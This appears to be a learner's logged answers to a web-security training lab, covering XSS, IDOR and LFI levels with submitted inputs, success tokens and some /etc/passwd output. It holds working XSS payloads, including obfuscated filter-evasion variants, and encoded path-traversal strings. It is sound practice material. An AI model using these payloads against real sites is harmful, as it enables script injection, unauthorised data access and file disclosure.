@@ -1,0 +1,131 @@
+XSS Learning Lab - Level 1
+Enter text: 
+<script>alert(1)</script>
+Submit
+Correct solution!
+Your token is valid for 10 minutes from now: fc6d5a08331c79937666afa4d7bfd36ab692d240
+-------------------------------------------------------------------------------------
+
+XSS Learning Lab - Level 2
+Enter text: 
+<img src=x onerror=alert('XSS')>
+Submit
+Correct solution!
+Your token is valid for 10 minutes from now: ed72befba0a3a62490aaa6bc5e5f8959e321faa8
+
+-------------------------------------------------------------------------------------
+XSS Learning Lab - Level 3
+Enter text: 
+<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>
+Submit
+Correct solution!
+Your token is valid for 10 minutes from now: 1cded50aa44b8357f40b8e1e7ff57f8900c10678
+
+------------------------------------------------------------------------------------
+XSS Learning Lab - Level 4
+Enter text: 
+"onclick=prompt(8)><svg/onload=prompt(8)>"@x.y
+Submit
+Correct solution!
+Your token is valid for 10 minutes from now: f01ad1a603c5fc38740f03ebd2637d0db3719ab4 "onclick=prompt(8)>
+---------------------------------------------------------------------------------------------------------
+IDOR Learning Lab - Level 1
+Enter User ID: 
+2
+View User
+Great! You have accessed another user!
+Your token is valid for 10 minutes from now: 6fa412d71005a89649352880f2ee2238bf812782
+------------------------------------------------------------------------------------
+IDOR Learning Lab - Level 2
+Enter User ID: 
+2
+ Token: 
+1a30d77fe7944b9e0a31943c9cb481e47c63baa7
+View User
+User Information:
+Name: Bob
+
+Email: bob@example.com
+-------------------------------------------------------------------------------------
+IDOR Learning Lab - Level 3
+Enter User ID: 
+3
+ Token: 
+3bdc2df40fe0454aeb5d12c5ab89e6e0fe870ca3
+View User
+User Information:
+Name: Charlie
+
+Email: charlie@example.com
+------------------------------------------------------------------------------------
+IDOR Learning Lab - Level 4
+Enter User ID: 
+1
+ Token: 
+6f1891a12ac057f4853a84bab40f414e34981489
+View User
+User Information:
+Name: Alice
+
+Email: alice@example.com
+------------------------------------------------------------------------------------
+IDOR Learning Lab - Level 5
+Enter User ID: 
+2
+ Token: 
+563b0135e5052e54d0e634f2968bcb85d1976be2
+View User
+User Information:
+Name: Bob
+
+Email: bob@example.com
+------------------------------------------------------------------------------------
+
+2KjZiNis2YjZh9ix2Ycg2Ygg2YbZiNin2YEg2YjYtCDYp9mE2LnZhNmFINin2LHYs9mE2YjZhNmKIDopINmI2YTYpyDYqNi52YTZhQ==
+
+https://discord.gg/2d2QEud8
+----------------------------------------------------------------------------------
+LFI Learning Lab - Level 2
+Enter file name: 
+../..//etc/passwd
+Include File
+Correct, you solved it!
+Your token is valid for 10 minutes from now: 083c221c58cf46c32b94240b8092e1f889f6f248
+-----------------------------------------------------------------------------------
+LFI Learning Lab - Level 1
+Enter file name: 
+//etc/passwd
+Include File
+Correct, you solved it!
+Your token is valid for 10 minutes from now: 5a5a035d2bee5d8a1febbbe48bcd4887af529ca9
+----------------------------------------------------------------------------------
+XSS Learning Lab - Level 5
+Enter text: 
+Submit
+Result: I used technique that used all payloads from github page
+----------------------------------------------------------------------------------
+LFI Learning Lab - Level 3
+Enter file name: 
+e7c1299fdf5f85ff08a3436a241f811e8dd1c47c & Black king and salah
+Include File
+Invalid file path or unauthorized file access!
+---------------------------------------------------------------------------------
+LFI Learning Lab - Level 4
+Enter file name: 
+%2e%2e/%2e%2e/%2e%2e//etc/passwd
+Include File
+Correct, you solved it!
+Your token is valid for 10 minutes from now: 5fec917e52563fab0d22996e26dd721780392886
+File Content:
+root:x:0:0:root:/root:/bin/bash
+---------------------------------------------------------------------------------
+LFI Learning Lab - Level 5
+Enter file name: 
+..%2f..%2f..%2f/etc/passwd
+Include File
+Correct, you solved it!
+Your token is valid for 10 minutes from now: 19d7e8d0366d8200ae088dbba2bd9f95ae385516
+File Content:
+root:x:0:0:root:/root:/bin/bash
+---------------------------------------------------------------------------------
+
